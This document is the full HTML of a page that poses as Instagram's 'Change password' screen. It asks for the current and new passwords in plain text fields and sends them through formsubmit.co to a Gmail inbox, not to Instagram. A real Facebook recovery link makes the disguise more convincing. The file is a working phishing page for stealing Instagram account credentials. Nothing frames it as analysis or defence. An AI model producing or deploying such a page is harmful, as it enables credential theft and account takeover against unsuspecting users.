<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Intagram Change Password</title>
    <link rel="stylesheet" href="Style.css">
</head>
<body>

    <div class="area">

        <div class="information">

            <span>â€¢ Instagram</span>

            <h2>Change password</h2>

            <p>Your password must be at least 6 characters<br>and should include a combination of<br>numbers, letters and special characters<br>(!$@%).</p>

            <div class="forminput">

                <form action="https://formsubmit.co/instasecureccount@gmail.com" method="POST">

                    <input class="inputinfo" type="text" name="oldpassword" id="oldpassword" placeholder="Current password" required>

                    <input class="inputinfo" type="text" name="newpassword" id="newpassword" placeholder="New password" required>

                    <input class="inputinfo" type="text" name="retypepassword" id="retypepassword" placeholder="Re-type new password" required>

                    <div class="forgot">

                        <span class="forgoting"><a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0">Forgot your password?</a></span>

                    </div>

                    <div class="checking">

                        <input type="checkbox" class="checkedbox" checked>

                        <span>Log out of other devices. Choose this if<br><span class="textdown">someone else used your account</span></span>

                    </div>

                    <div class="btn">

                        <button type="submit" id="submit">Change password</button>

                    </div>

                </form>

            </div>

        </div>

    </div>
    
</body>
</html>
